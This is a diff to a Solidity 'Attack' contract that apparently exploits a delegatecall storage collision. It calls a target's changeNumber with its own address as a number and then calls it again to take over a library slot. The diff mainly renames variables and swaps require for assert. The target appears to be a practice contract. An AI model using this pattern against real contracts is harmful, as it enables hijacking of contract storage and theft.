@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: SEE LICENSE IN LICENSE
 pragma solidity ^0.8.17;
 
-import "./Target.sol";
+import "hardhat/console.sol";
 
 contract Attack {
     address public lib;
@@ -13,19 +13,19 @@ contract Attack {
         console.log(uint160(address(this)));
         console.log(uint(uint160(address(this))));
 
-        (bool success, ) = target.call(
+        (bool ok, ) = target.call(
             abi.encodeWithSignature(
                 "changeNumber(uint256)",
                 uint(uint160(address(this)))
             )
         );
 
-        (bool success2, ) = target.call(
+        (bool ok2, ) = target.call(
             abi.encodeWithSignature("changeNumber(uint256)", 1)
         );
 
-        require(success, "1");
-        require(success2, "2");
+        assert(ok);
+        assert(ok2);
     }
 
     function changeNumber(uint _num) external {
